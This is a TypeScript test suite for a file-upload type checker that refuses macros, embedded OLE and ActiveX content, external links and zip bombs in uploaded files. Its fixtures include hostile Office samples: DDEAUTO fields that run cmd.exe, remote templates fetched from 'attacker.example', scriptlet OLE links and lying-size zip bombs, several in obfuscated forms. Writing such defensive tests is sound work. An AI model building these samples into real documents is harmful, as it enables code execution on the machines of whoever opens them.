// node --test supabase/functions/_shared/team-hub-file-type.test.ts
// EXP08 Team Hub increment 3: the real-type check (contract §1 table, §8 unit tests).
// Every fixture is real bytes: the Office files are genuine ZIP archives written by the tiny writer
// below (stored and deflated entries, real CRC-32, central directory and end record), so the
// detector is exercised on the structure Office itself produces, not on a string that merely
// starts with "PK". The check is async (it inflates Word and Excel parts), so every call is awaited.
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { deflateRawSync } from "node:zlib";
import { spawnSync } from "node:child_process";
import process from "node:process";
import { detectTeamHubFileType, teamHubFileVerdict, zipEntryNames } from "./team-hub-file-type.ts";

const DOCX = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
const XLSX = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
const text = (value: string) => new TextEncoder().encode(value);
const concat = (...parts: Uint8Array[]) => {
  const out = new Uint8Array(parts.reduce((sum, part) => sum + part.length, 0));
  let at = 0;
  for (const part of parts) { out.set(part, at); at += part.length; }
  return out;
};

const CRC_TABLE = Array.from({ length: 256 }, (_, n) => {
  let c = n;
  for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
  return c >>> 0;
});
function crc32(bytes: Uint8Array) {
  let c = 0xffffffff;
  for (const byte of bytes) c = CRC_TABLE[(c ^ byte) & 0xff] ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
}

type Entry = {
  name: string; data: string | Uint8Array; deflate?: boolean; hideFromDirectory?: boolean;
  // Hostile shapes: a recorded size that lies, a compression method other than stored/deflate, or a body that is not what the method says.
  declaredSize?: number; method?: number; body?: Uint8Array;
};

/** A real ZIP: local header + data per entry, then the central directory and the end record. */
function zip(entries: Entry[]): Uint8Array {
  const locals: Uint8Array[] = [], centrals: Uint8Array[] = [];
  let offset = 0, listed = 0;
  for (const entry of entries) {
    const name = text(entry.name);
    const raw = typeof entry.data === "string" ? text(entry.data) : entry.data;
    const body = entry.body ?? (entry.deflate ? new Uint8Array(deflateRawSync(raw)) : raw);
    const method = entry.method ?? (entry.deflate ? 8 : 0), crc = crc32(raw);
    const size = entry.declaredSize ?? raw.length;
    const local = new Uint8Array(30 + name.length), lv = new DataView(local.buffer);
    lv.setUint32(0, 0x04034b50, true); lv.setUint16(4, 20, true); lv.setUint16(8, method, true);
    lv.setUint32(14, crc, true); lv.setUint32(18, body.length, true); lv.setUint32(22, size, true);
    lv.setUint16(26, name.length, true); local.set(name, 30);
    if (!entry.hideFromDirectory) {
      const central = new Uint8Array(46 + name.length), cv = new DataView(central.buffer);
      cv.setUint32(0, 0x02014b50, true); cv.setUint16(4, 20, true); cv.setUint16(6, 20, true);
      cv.setUint16(10, method, true); cv.setUint32(16, crc, true); cv.setUint32(20, body.length, true);
      cv.setUint32(24, size, true); cv.setUint16(28, name.length, true); cv.setUint32(42, offset, true);
      central.set(name, 46);
      centrals.push(central);
      listed++;
    }
    locals.push(local, body);
    offset += local.length + body.length;
  }
  const directory = concat(...centrals);
  const end = new Uint8Array(22), ev = new DataView(end.buffer);
  ev.setUint32(0, 0x06054b50, true); ev.setUint16(8, listed, true); ev.setUint16(10, listed, true);
  ev.setUint32(12, directory.length, true); ev.setUint32(16, offset, true);
  return concat(...locals, directory, end);
}

const CONTENT_TYPES = '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>';
const RELS = '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>';
const docxEntries = (deflate = false): Entry[] => [
  { name: "[Content_Types].xml", data: CONTENT_TYPES, deflate },
  { name: "_rels/.rels", data: RELS, deflate },
  { name: "word/document.xml", data: '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Hello team</w:t></w:r></w:p></w:body></w:document>', deflate },
];
const xlsxEntries = (deflate = false): Entry[] => [
  { name: "[Content_Types].xml", data: CONTENT_TYPES, deflate },
  { name: "_rels/.rels", data: RELS, deflate },
  { name: "xl/workbook.xml", data: '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheets/></workbook>', deflate },
  { name: "xl/worksheets/sheet1.xml", data: '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"/>', deflate },
];
const VBA = new Uint8Array([0xcc, 0x61, 0xff, 0xff, 0x00, 0x00, 0x01, 0x00]);

const pdf = text("%PDF-1.4\n1 0 obj << /Type /Catalog >> endobj\ntrailer << /Root 1 0 R >>\n%%EOF\n");
const png = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13, 0x49, 0x48, 0x44, 0x52, 0, 0, 0, 1, 0, 0, 0, 1, 8, 6, 0, 0, 0]);
const jpeg = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01, 0xff, 0xd9]);
const webp = concat(text("RIFF"), new Uint8Array([26, 0, 0, 0]), text("WEBPVP8L"), new Uint8Array([13, 0, 0, 0, 0x2f, 0, 0, 0, 0, 0, 0, 0, 0, 0]));
const gif87 = concat(text("GIF87a"), new Uint8Array([1, 0, 1, 0, 0, 0, 0, 0x3b]));
const gif89 = concat(text("GIF89a"), new Uint8Array([1, 0, 1, 0, 0, 0, 0, 0x3b]));
// The OLE compound-file header every legacy .doc/.xls begins with.
const ole = concat(new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]), new Uint8Array(504));
// A Windows executable's DOS header ("MZ", e_lfanew at 0x3c) followed by the PE signature.
const exe = (() => {
  const bytes = new Uint8Array(256);
  bytes.set([0x4d, 0x5a, 0x90, 0x00, 0x03], 0);
  bytes[0x3c] = 0x80;
  bytes.set([0x50, 0x45, 0x00, 0x00, 0x4c, 0x01], 0x80);
  return bytes;
})();

describe("allowed types are accepted when the bytes match the declared type", () => {
  const cases: Array<[string, Uint8Array, string]> = [
    ["PDF", pdf, "application/pdf"],
    ["PNG", png, "image/png"],
    ["JPEG", jpeg, "image/jpeg"],
    ["WEBP", webp, "image/webp"],
    ["GIF87a", gif87, "image/gif"],
    ["GIF89a", gif89, "image/gif"],
    ["Word (stored)", zip(docxEntries()), DOCX],
    ["Word (deflated)", zip(docxEntries(true)), DOCX],
    ["Excel (stored)", zip(xlsxEntries()), XLSX],
    ["Excel (deflated)", zip(xlsxEntries(true)), XLSX],
    ["text", text("Agenda for Monday\n- review the launch\n"), "text/plain"],
    ["text with a BOM and multibyte UTF-8", concat(new Uint8Array([0xef, 0xbb, 0xbf]), text("Café — 日本語 ✓\n")), "text/plain"],
    ["CSV", text("name,stage\nAva,Onboarding\n"), "text/csv"],
  ];
  for (const [label, bytes, mime] of cases) {
    it(label, async () => {
      assert.deepEqual(await teamHubFileVerdict(bytes, mime), { accept: true, detectedMime: mime, reason: null });
    });
  }
});

describe("refusals", () => {
  it("a Word file carrying a macro project is refused", async () => {
    const bytes = zip([...docxEntries(true), { name: "word/vbaProject.bin", data: VBA }]);
    assert.deepEqual(await teamHubFileVerdict(bytes, DOCX), { accept: false, detectedMime: null, reason: "macro_content" });
  });
  it("an Excel file carrying a macro project is refused, whatever the case of its name", async () => {
    const bytes = zip([...xlsxEntries(), { name: "xl/VBAPROJECT.BIN", data: VBA, deflate: true }]);
    assert.equal((await teamHubFileVerdict(bytes, XLSX)).reason, "macro_content");
  });
  it("a macro project hidden from the central directory is still found", async () => {
    const bytes = zip([...docxEntries(), { name: "word/vbaProject.bin", data: VBA, hideFromDirectory: true }]);
    assert.deepEqual(zipEntryNames(bytes), ["[Content_Types].xml", "_rels/.rels", "word/document.xml"]);
    assert.equal((await teamHubFileVerdict(bytes, DOCX)).reason, "macro_content");
  });
  it("a legacy OLE .doc is refused even when it claims to be Word", async () => {
    assert.deepEqual(await teamHubFileVerdict(ole, DOCX), { accept: false, detectedMime: null, reason: "legacy_office" });
  });
  it("an executable named .pdf is refused", async () => {
    assert.deepEqual(await teamHubFileVerdict(exe, "application/pdf"), { accept: false, detectedMime: null, reason: "unrecognised" });
  });
  it("text containing a NUL byte is not text", async () => {
    assert.equal((await teamHubFileVerdict(text("line one\u0000line two"), "text/plain")).reason, "unrecognised");
  });
  it("invalid UTF-8 is not text", async () => {
    assert.equal((await teamHubFileVerdict(new Uint8Array([0x68, 0x69, 0xc3, 0x28, 0x0a]), "text/csv")).reason, "unrecognised");
  });
  it("a real type that differs from the declared one is a mismatch", async () => {
    assert.deepEqual(await teamHubFileVerdict(png, "text/plain"), { accept: false, detectedMime: "image/png", reason: "mismatch" });
    assert.deepEqual(await teamHubFileVerdict(zip(docxEntries()), XLSX), { accept: false, detectedMime: DOCX, reason: "mismatch" });
    assert.deepEqual(await teamHubFileVerdict(pdf, "image/jpeg"), { accept: false, detectedMime: "application/pdf", reason: "mismatch" });
  });
  it("a ZIP that is not a Word or Excel document is refused", async () => {
    assert.equal((await teamHubFileVerdict(zip([{ name: "notes.txt", data: "hi" }]), DOCX)).reason, "malformed_document");
    assert.equal((await teamHubFileVerdict(zip([{ name: "[Content_Types].xml", data: CONTENT_TYPES }]), DOCX)).reason, "malformed_document");
  });
  it("an OOXML package without [Content_Types].xml is refused", async () => {
    const bytes = zip(docxEntries().filter((entry) => entry.name !== "[Content_Types].xml"));
    assert.equal((await teamHubFileVerdict(bytes, DOCX)).reason, "malformed_document");
  });
  it("a package claiming to be both Word and Excel is refused", async () => {
    const bytes = zip([...docxEntries(), { name: "xl/workbook.xml", data: "<workbook/>" }]);
    assert.equal((await teamHubFileVerdict(bytes, DOCX)).reason, "malformed_document");
  });
  it("a truncated ZIP is refused", async () => {
    const whole = zip(docxEntries());
    assert.equal((await teamHubFileVerdict(whole.subarray(0, whole.length - 30), DOCX)).reason, "malformed_document");
    assert.equal(zipEntryNames(whole.subarray(0, whole.length - 30)), null);
  });
  it("a RIFF container that is not WEBP is refused", async () => {
    const wave = concat(text("RIFF"), new Uint8Array([4, 0, 0, 0]), text("WAVEfmt "));
    assert.equal((await teamHubFileVerdict(wave, "image/webp")).reason, "unrecognised");
  });
  it("a declared type outside the allow-list is refused before the bytes are read", async () => {
    for (const mime of ["application/msword", "application/vnd.ms-excel",
      "application/vnd.openxmlformats-officedocument.presentationml.presentation", "application/zip", "text/html", ""]) {
      assert.deepEqual(await teamHubFileVerdict(pdf, mime), { accept: false, detectedMime: null, reason: "not_allowed" });
    }
  });
  it("an empty file is refused", async () => {
    assert.equal((await teamHubFileVerdict(new Uint8Array(0), "text/plain")).reason, "empty");
  });
  it("a file over 10 MB is refused", async () => {
    const big = new Uint8Array(10 * 1024 * 1024 + 1).fill(0x61);
    assert.equal((await teamHubFileVerdict(big, "text/plain")).reason, "too_large");
    assert.equal((await teamHubFileVerdict(big.subarray(0, 10 * 1024 * 1024), "text/plain")).accept, true);
  });
});

describe("text is the one class the declared type splits", () => {
  it("plain text and CSV are both text, and nothing else", async () => {
    const bytes = text("a,b\n1,2\n");
    assert.equal((await detectTeamHubFileType(bytes, "text/csv")).mime, "text/csv");
    assert.equal((await detectTeamHubFileType(bytes, "text/plain")).mime, "text/plain");
    assert.equal((await detectTeamHubFileType(bytes, "application/pdf")).mime, "text/plain");
  });
  it("binary signatures win over text, so a renamed image is never text", async () => {
    assert.equal((await detectTeamHubFileType(gif89, "text/plain")).mime, "image/gif");
  });
});

// Word and Excel can do harm with no macro at all. Each fixture below is the real part layout Office
// writes for that feature, so the check is proved on the shape an attacker would actually send.
const W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"';
const REL_NS = 'xmlns="http://schemas.openxmlformats.org/package/2006/relationships"';
const R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
const rels = (...relationships: string[]) => `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships ${REL_NS}>${relationships.join("")}</Relationships>`;
const wordBody = (body: string) => `<?xml version="1.0" encoding="UTF-8"?><w:document ${W}><w:body>${body}</w:body></w:document>`;
const withDocument = (body: string, extra: Entry[] = [], deflate = true): Uint8Array =>
  zip([...docxEntries(deflate).filter((entry) => entry.name !== "word/document.xml"), { name: "word/document.xml", data: wordBody(body), deflate }, ...extra]);
const docxWith = (extra: Entry[], deflate = true) => zip([...docxEntries(deflate), ...extra]);
const xlsxWith = (extra: Entry[], deflate = true) => zip([...xlsxEntries(deflate), ...extra]);
const refusal = async (bytes: Uint8Array, mime = DOCX) => (await teamHubFileVerdict(bytes, mime)).reason;
const accepted = async (bytes: Uint8Array, mime = DOCX) =>
  assert.deepEqual(await teamHubFileVerdict(bytes, mime), { accept: true, detectedMime: mime, reason: null });
const ddeRun = (instruction: string) =>
  `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve">${instruction}</w:instrText></w:r>` +
  `<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>shown</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`;

describe("Word and Excel content that runs or loads something without a macro", () => {
  it("a Word file whose template is fetched from outside the file (remote attachedTemplate) is refused", async () => {
    const bytes = docxWith([
      { name: "word/settings.xml", data: `<w:settings ${W}><w:attachedTemplate r:id="rId1" xmlns:r="${R}"/></w:settings>`, deflate: true },
      { name: "word/_rels/settings.xml.rels", data: rels(`<Relationship Id="rId1" Type="${R}/attachedTemplate" Target="https://attacker.example/t.dotm" TargetMode="External"/>`), deflate: true },
    ]);
    assert.deepEqual(await teamHubFileVerdict(bytes, DOCX), { accept: false, detectedMime: null, reason: "external_content" });
  });
  it("a Word file with an ordinary external hyperlink is accepted", async () => {
    await accepted(withDocument('<w:p><w:hyperlink r:id="rId9" xmlns:r="' + R + '"><w:r><w:t>our site</w:t></w:r></w:hyperlink></w:p>', [
      { name: "word/_rels/document.xml.rels", data: rels(`<Relationship Id="rId9" Type="${R}/hyperlink" Target="https://example.com/a?b=1&amp;c=2" TargetMode="External"/>`), deflate: true },
    ]));
  });
  it("an Excel file with an ordinary external hyperlink is accepted, stored or deflated", async () => {
    for (const deflate of [false, true]) {
      await accepted(xlsxWith([
        { name: "xl/worksheets/_rels/sheet1.xml.rels", data: rels(`<Relationship Id="rId1" Type="${R}/hyperlink" Target="https://example.com/" TargetMode="External"/>`), deflate },
      ], deflate), XLSX);
    }
  });
  it("an external target of any other kind is refused, however TargetMode is spelled", async () => {
    for (const relationship of [
      `<Relationship Id="rId1" Type="${R}/oleObject" Target="file://host/share/x.sct" TargetMode="External"/>`,
      `<Relationship Id="rId1" Type="${R}/image" Target="https://attacker.example/pixel.png" TargetMode="External"/>`,
      `<Relationship Id="rId1" Type="${R}/frame" Target="https://attacker.example/" TargetMode="External"/>`,
      `<Relationship TargetMode="External" Target="https://attacker.example/" Id="rId1" Type="${R}/attachedTemplate"/>`,
      `<Relationship Id="rId1" Type="${R}/attachedTemplate" Target="https://attacker.example/" TargetMode="external"/>`,
      `<Relationship Id="rId1" Type="${R}/attachedTemplate" Target="https://attacker.example/" TargetMode="Ext&#101;rnal"/>`,
      `<Relationship Id="rId1" Type='${R}/attachedTemplate' Target='https://attacker.example/' TargetMode = 'External' />`,
      `<pr:Relationship xmlns:pr="http://schemas.openxmlformats.org/package/2006/relationships" Id="rId1" Type="${R}/attachedTemplate" Target="https://attacker.example/" TargetMode="External"/>`,
      // A hyperlink type with a second Type attribute is not one plain hyperlink.
      `<Relationship Id="rId1" Type="${R}/hyperlink" Type="${R}/attachedTemplate" Target="https://attacker.example/" TargetMode="External"/>`,
    ]) {
      assert.equal(await refusal(docxWith([{ name: "word/_rels/settings.xml.rels", data: rels(relationship), deflate: true }])), "external_content", relationship);
    }
  });
  it("an Excel file with an external workbook link (xl/externalLinks/) is refused", async () => {
    const bytes = xlsxWith([
      { name: "xl/externalLinks/externalLink1.xml", data: '<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><ddeLink ddeService="cmd" ddeTopic="/c calc"/></externalLink>', deflate: true },
    ]);
    assert.deepEqual(await teamHubFileVerdict(bytes, XLSX), { accept: false, detectedMime: null, reason: "external_content" });
  });
  it("an internal externalLink relationship is refused even when its part hides under another folder", async () => {
    const bytes = xlsxWith([
      { name: "xl/_rels/workbook.xml.rels", data: rels(`<Relationship Id="rId3" Type="${R}/externalLink" Target="links/one.xml"/>`), deflate: true },
      { name: "xl/links/one.xml", data: '<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"/>', deflate: true },
    ]);
    assert.equal(await refusal(bytes, XLSX), "external_content");
  });
  it("an embedded OLE object (embeddings/oleObject1.bin) is refused", async () => {
    const bytes = docxWith([{ name: "word/embeddings/oleObject1.bin", data: ole }]);
    assert.deepEqual(await teamHubFileVerdict(bytes, DOCX), { accept: false, detectedMime: null, reason: "embedded_content" });
  });
  it("ActiveX, ribbon customisation, embedded packages and stray .bin parts are refused", async () => {
    for (const name of ["word/activeX/activeX1.xml", "xl/activeX/activeX1.bin", "customUI/customUI14.xml", "word/embeddings/Microsoft_Excel_Worksheet.xlsx",
      "word/media/payload.bin", "WORD/ACTIVEX/activeX1.xml", "word/activ%65X/activeX1.xml", "word/embedding%73/oleObject1.dat"]) {
      assert.equal(await refusal(docxWith([{ name, data: "<x/>" }])), "embedded_content", name);
    }
    assert.equal(await refusal(xlsxWith([{ name: "xl/embeddings/oleObject1.bin", data: ole }]), XLSX), "embedded_content");
  });
  it("a vbaProject part under any name or case is a macro", async () => {
    for (const name of ["word/vbaProjectSignature.bin", "xl/vbaproject2.xml", "word/vbaProject%2Ebin"]) {
      assert.equal(await refusal(docxWith([{ name, data: "<x/>" }])), "macro_content", name);
    }
  });
  it("an internal relationship to an OLE object, control, package or macro is refused wherever its part lives", async () => {
    for (const [type, reason] of [
      [`${R}/oleObject`, "embedded_content"],
      [`${R}/package`, "embedded_content"],
      [`${R}/control`, "embedded_content"],
      ["http://schemas.microsoft.com/office/2006/relationships/activeXControlBinary", "embedded_content"],
      ["http://schemas.microsoft.com/office/2007/relationships/ui/extensibility", "embedded_content"],
      ["http://schemas.microsoft.com/office/2006/relationships/vbaProject", "macro_content"],
    ]) {
      const bytes = withDocument("<w:p/>", [
        { name: "word/_rels/document.xml.rels", data: rels(`<Relationship Id="rId5" Type="${type}" Target="media/thing.xml"/>`), deflate: true },
        { name: "word/media/thing.xml", data: "<x/>", deflate: true },
      ]);
      assert.equal(await refusal(bytes), reason, type);
    }
  });
  it("printer setup is the one .bin accepted, and only as printer settings", async () => {
    const printer = (type: string) => xlsxWith([
      { name: "xl/worksheets/_rels/sheet1.xml.rels", data: rels(`<Relationship Id="rId1" Type="${R}/${type}" Target="../printerSettings/printerSettings1.bin"/>`), deflate: true },
      { name: "xl/printerSettings/printerSettings1.bin", data: new Uint8Array(64).fill(7) },
    ]);
    await accepted(printer("printerSettings"), XLSX);
    assert.equal(await refusal(printer("oleObject"), XLSX), "embedded_content");
    assert.equal(await refusal(printer("image"), XLSX), "embedded_content");
  });
  it("a DDE or DDEAUTO field instruction is refused, in every way Word stores one", async () => {
    for (const [label, body] of [
      ["DDEAUTO complex field", ddeRun('DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc"')],
      ["DDE complex field", ddeRun('DDE "Excel" "Sheet1" "R1C1"')],
      ["lower-case keyword after spaces", ddeRun("   ddeauto c:\\\\x.exe")],
      ["instruction split across runs",
        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>DD</w:instrText></w:r><w:r><w:instrText>EAUTO c:\\\\x.exe</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'],
      ["entity-encoded keyword", ddeRun("&#68;DEAUTO c:\\\\x.exe")],
      ["CDATA keyword", ddeRun("<![CDATA[DDEAUTO c:\\\\x.exe]]>")],
      ["simple field", '<w:p><w:fldSimple w:instr=" DDEAUTO c:\\\\x.exe "><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p>'],
      ["keyword computed by a nested QUOTE field",
        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>QUOTE 68 68 69</w:instrText></w:r>' +
        '<w:r><w:fldChar w:fldCharType="end"/></w:r><w:r><w:instrText> c:\\\\x.exe</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'],
    ]) {
      assert.deepEqual(await teamHubFileVerdict(withDocument(body), DOCX), { accept: false, detectedMime: null, reason: "dde_field" }, label);
    }
  });
  it("a DDE field in a header part is refused too", async () => {
    const bytes = docxWith([{ name: "word/header1.xml", data: `<w:hdr ${W}>${ddeRun("DDEAUTO c:\\\\x.exe")}</w:hdr>`, deflate: true }]);
    assert.equal(await refusal(bytes), "dde_field");
  });
  it("ordinary fields, and the word DDE as body text, are accepted", async () => {
    await accepted(withDocument(ddeRun(" PAGE ") + ddeRun('HYPERLINK "https://example.com"') + ddeRun("DATE \\@ \"d MMMM\"") +
      "<w:p><w:r><w:t>DDEAUTO is a field we refuse</w:t></w:r></w:p>"));
  });
  it("a part declaring an encoding other than UTF-8 or UTF-16 is refused", async () => {
    const body = '<?xml version="1.0" encoding="UTF-7"?><w:document ' + W + "><w:body/></w:document>";
    const bytes = zip([...docxEntries(true).filter((entry) => entry.name !== "word/document.xml"), { name: "word/document.xml", data: body, deflate: true }]);
    assert.equal(await refusal(bytes), "malformed_document");
  });
  it("a part name that is not a clean URI is refused", async () => {
    assert.equal(await refusal(docxWith([{ name: "word\\activeX\\activeX1.xml", data: "<x/>" }])), "malformed_document");
    assert.equal(await refusal(docxWith([{ name: "word/%E0%A4%A.xml", data: "<x/>" }])), "malformed_document");
  });
});

describe("inflating Word and Excel parts is bounded and fails closed", () => {
  it("a document whose parts would inflate past 50 MB is refused before anything is inflated", async () => {
    const bytes = zip([...docxEntries(true).filter((entry) => entry.name !== "word/document.xml"),
      { name: "word/document.xml", data: new Uint8Array(51 * 1024 * 1024).fill(0x20), deflate: true }]);
    assert.ok(bytes.length < 10 * 1024 * 1024, "the bomb fits under the upload cap");
    assert.equal(await refusal(bytes), "oversized_document");
  });
  it("several parts that together pass 50 MB are refused", async () => {
    const big = new Uint8Array(26 * 1024 * 1024).fill(0x20);
    const bytes = docxWith([{ name: "word/header1.xml", data: big, deflate: true }, { name: "word/footer1.xml", data: big, deflate: true }]);
    assert.equal(await refusal(bytes), "oversized_document");
  });
  it("a part that inflates past its recorded size (a lying bomb) is refused, not expanded", async () => {
    const bytes = zip([...docxEntries(true).filter((entry) => entry.name !== "word/document.xml"),
      { name: "word/document.xml", data: new Uint8Array(60 * 1024 * 1024).fill(0x20), deflate: true, declaredSize: 1024 }]);
    assert.equal(await refusal(bytes), "malformed_document");
  });
  it("inflation stops at the recorded size: a lying bomb never expands in memory", async () => {
    // Count the bytes the real DecompressionStream hands the reader. Without the stop, every one
    // of the 60 MB would be inflated before the size mismatch was noticed.
    const Real = globalThis.DecompressionStream;
    let produced = 0;
    globalThis.DecompressionStream = class {
      readable: ReadableStream<Uint8Array>; writable: WritableStream<Uint8Array>;
      constructor(format: "deflate-raw") {
        const inner = new Real(format);
        this.writable = inner.writable;
        this.readable = inner.readable.pipeThrough(new TransformStream<Uint8Array, Uint8Array>({
          transform(chunk, controller) { produced += chunk.length; controller.enqueue(chunk); },
        }));
      }
    } as unknown as typeof DecompressionStream;
    try {
      const bytes = zip([...docxEntries(true).filter((entry) => entry.name !== "word/document.xml"),
        { name: "word/document.xml", data: new Uint8Array(60 * 1024 * 1024).fill(0x20), deflate: true, declaredSize: 1024 }]);
      assert.equal(await refusal(bytes), "malformed_document");
      assert.ok(produced < 4 * 1024 * 1024, `inflated ${produced} bytes before stopping`);
    } finally {
      globalThis.DecompressionStream = Real;
    }
  });
  // Deno's DecompressionStream (the edge runtime) returns ALL the output of one written chunk as one
  // chunk; Node's splits it. So a bound that holds on Node can fail on Deno. These two tests pin the
  // property that makes the ceiling hold on both: compressed bytes go in small pieces.
  const withDecompressor = async (make: (Real: typeof DecompressionStream) => typeof DecompressionStream, run: () => Promise<void>) => {
    const Real = globalThis.DecompressionStream;
    globalThis.DecompressionStream = make(Real);
    try { await run(); } finally { globalThis.DecompressionStream = Real; }
  };
  // The bomb is the first part in the archive, so it is the first part inflated: the stand-in below
  // answers every part with filler, and must meet the bomb before any other part is refused.
  const lyingBomb = () => zip([{ name: "word/document.xml", data: new Uint8Array(60 * 1024 * 1024).fill(0x20), deflate: true, declaredSize: 1024 },
    ...docxEntries(true).filter((entry) => entry.name !== "word/document.xml")]);
  it("a decompressor that answers each written chunk in one piece (as Deno's does) still never holds a bomb", async () => {
    // A stand-in with Deno's shape at deflate's worst ratio: each written chunk comes back as ONE
    // chunk of 1032 bytes per compressed byte. Writing the whole entry at once would hand back 60 MB
    // in a single read; in 4 KiB pieces no read is over ~4 MB and the refusal comes on the first.
    let produced = 0, largest = 0;
    await withDecompressor(() => class {
      readable: ReadableStream<Uint8Array>; writable: WritableStream<Uint8Array>;
      constructor() {
        const pass = new TransformStream<Uint8Array, Uint8Array>({
          transform(chunk, controller) {
            const out = new Uint8Array(chunk.length * 1032).fill(0x20);
            produced += out.length; largest = Math.max(largest, out.length);
            controller.enqueue(out);
          },
        });
        this.readable = pass.readable; this.writable = pass.writable;
      }
    } as unknown as typeof DecompressionStream, async () => {
      assert.equal(await refusal(lyingBomb()), "malformed_document");
    });
    assert.ok(produced > 0, "the stand-in was used");
    assert.ok(largest <= 4096 * 1032, `one read handed back ${largest} bytes`);
    assert.ok(produced <= 2 * 4096 * 1032, `inflated ${produced} bytes before stopping`);
  });
  it("compressed bytes reach the real decompressor in pieces of at most 4 KiB, and a part spanning many pieces still reads whole", async () => {
    let largestWrite = 0, writes = 0;
    await withDecompressor((Real) => class {
      readable: ReadableStream<Uint8Array>; writable: WritableStream<Uint8Array>;
      constructor(format: "deflate-raw") {
        const inner = new Real(format);
        this.readable = inner.readable;
        const tap = new TransformStream<Uint8Array, Uint8Array>({
          transform(chunk, controller) { writes++; largestWrite = Math.max(largestWrite, chunk.length); controller.enqueue(chunk); },
        });
        tap.readable.pipeTo(inner.writable).catch(() => {});
        this.writable = tap.writable;
      }
    } as unknown as typeof DecompressionStream, async () => {
      // Pseudo-random words compress poorly, so this part is well over 4 KiB compressed.
      let seed = 7;
      const words = Array.from({ length: 30000 }, () => { seed = (seed * 1103515245 + 12345) >>> 0; return seed.toString(36); });
      const bytes = withDocument(`<w:p><w:r><w:t>${words.join(" ")}</w:t></w:r></w:p>`);
      await accepted(bytes);
    });
    assert.ok(writes > 10, `only ${writes} writes reached the decompressor`);
    assert.ok(largestWrite <= 4096, `a ${largestWrite}-byte piece reached the decompressor`);
  });
  it("a part whose deflate stream is corrupt, or whose method is neither stored nor deflate, is refused", async () => {
    const corrupt = docxWith([{ name: "word/_rels/document.xml.rels", data: RELS, method: 8, body: new Uint8Array([0xff, 0xff, 0xff, 0xff]) }]);
    assert.equal(await refusal(corrupt), "malformed_document");
    const bzip2 = docxWith([{ name: "word/_rels/document.xml.rels", data: RELS, method: 12 }]);
    assert.equal(await refusal(bzip2), "malformed_document");
    const stored = docxWith([{ name: "word/_rels/document.xml.rels", data: RELS, declaredSize: RELS.length + 5 }]);
    assert.equal(await refusal(stored), "malformed_document");
  });
  it("a relationships part that is not well-formed is refused", async () => {
    for (const data of [rels('<Relationship Id="rId1" Type="x" Target="y'), `<!DOCTYPE r [<!ENTITY e "External">]>${rels('<Relationship Id="rId1" Type="x" TargetMode="&e;"/>')}`,
      rels('<!-- an unterminated comment <Relationship Id="rId1" TargetMode="External"/>'), rels("<Relationship Id=rId1/>")]) {
      assert.equal(await refusal(docxWith([{ name: "word/_rels/settings.xml.rels", data, deflate: true }])), "malformed_document", data);
    }
  });
});

describe("stripping comments, processing instructions and CDATA is linear and fails closed", () => {
  it("removing a construct cannot join its neighbours into a new opener", async () => {
    assert.equal(await refusal(withDocument("<w:p/><<!-- x -->!-- hidden <w:p/>")), "malformed_document");
    assert.equal(await refusal(withDocument("<w:p/><<?pi?>?hidden <w:p/>")), "malformed_document");
    await accepted(withDocument("<w:p><w:r><w:t><![CDATA[a < b > c & d]]></w:t></w:r></w:p><!-- note --><?pi x?>"));
  });
  it("a 2 MB part made of unterminated openers is refused at once, not after quadratic work", () => {
    // A regex that rescans to the end of the text for every unterminated `<!--` takes minutes on this
    // (measured: 0.2 MB already took 4 s); the linear pass takes milliseconds. A child process with a
    // hard deadline is used because a blocked event loop cannot time itself out.
    const module = new URL("./team-hub-file-type.ts", import.meta.url).href;
    const script = `import { teamHubFileVerdict } from ${JSON.stringify(module)};
      const chunks = []; for await (const chunk of process.stdin) chunks.push(chunk);
      const verdict = await teamHubFileVerdict(new Uint8Array(Buffer.concat(chunks)), ${JSON.stringify(DOCX)});
      process.stdout.write(String(verdict.reason));`;
    for (const opener of ["<!--", "<?", "<![CDATA["]) {
      const bytes = withDocument(opener.repeat(Math.ceil((2 * 1024 * 1024) / opener.length)));
      const child = spawnSync(process.execPath, [...process.execArgv.filter((flag) => !flag.startsWith("--test")), "--input-type=module", "-e", script],
        { input: bytes, encoding: "utf8", timeout: 20_000 });
      assert.equal(child.signal, null, `${opener}: still running at the 20 s deadline`);
      assert.equal(child.stdout, "malformed_document", `${opener}: ${child.stderr}`);
    }
  });
});
